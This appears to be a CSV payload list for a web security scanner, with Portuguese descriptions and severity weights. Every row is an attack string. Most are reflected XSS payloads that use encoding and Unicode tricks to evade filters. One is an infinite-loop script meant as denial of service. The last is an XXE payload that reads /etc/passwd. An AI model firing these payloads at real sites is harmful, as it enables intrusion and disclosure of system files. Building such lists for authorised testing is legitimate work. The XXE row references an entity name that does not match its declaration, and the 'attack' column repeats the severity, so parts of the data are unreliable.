payload,attack,category,weight,description,tags
"""""><STYLE>@import""""javascript:alert('XSS')"""";</STYLE>","MÉDIO","MÉDIO","4","XSS Refletido - CSS + import JS: Executar alert via CSS injection","xss,web,injection"
">""""'><img%20src%3D%26%23x6a;…alert(%26quot;%20XSS%20Test%20Successful%26quot;)>","MÉDIO","MÉDIO","4","XSS Refletido - URL-Encoding + HTML entity evasion: Executar alert com codificação dupla","xss,web,injection"
">%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>","MÉDIO","MÉDIO","4","XSS Refletido - URL-Encoding parcial: Executar alert","xss,web,injection"
"'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'","MÉDIO","MÉDIO","4","XSS Refletido - Unicode-Escape (UTF-16): Bypass filtros e executar alert","xss,web,injection"
""""""""";!--""""<XSS>=&{()}","BAIXO","BAIXO","1","XSS Refletido - Injeção com caracteres especiais: Quebrar parser e injetar <XSS>","xss,web,injection"
"<IMG SRC=""""javascript:alert('XSS');"""">","MÉDIO","MÉDIO","4","XSS Refletido - Tag IMG com atributo JS: Executar alert","xss,web,injection"
"<script>alert('XSS')</script>","ALTO","ALTO","7","XSS Refletido - Tag <script> direta: Executar alert","xss,web,injection"
"%3cscript%3ealert('XSS')%3c/script%3e","ALTO","ALTO","7","XSS Refletido - URL-Encoding completa: Executar alert","xss,web,injection"
"<![CDATA[<script>var n=0;while(true){n++;}</script>]]>","ALTO","ALTO","7","XSS em XML/HTML - CDATA embedding: Executar loop infinito (DoS)","xss,web,injection"
"<?xml version=""""1.0""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:///etc/passwd"""">]><foo>&xee;</foo>","CRÍTICO","CRÍTICO","10","XXE - External Entity (Unix passwd): Exfiltrar /etc/passwd","xxe,xml,external"
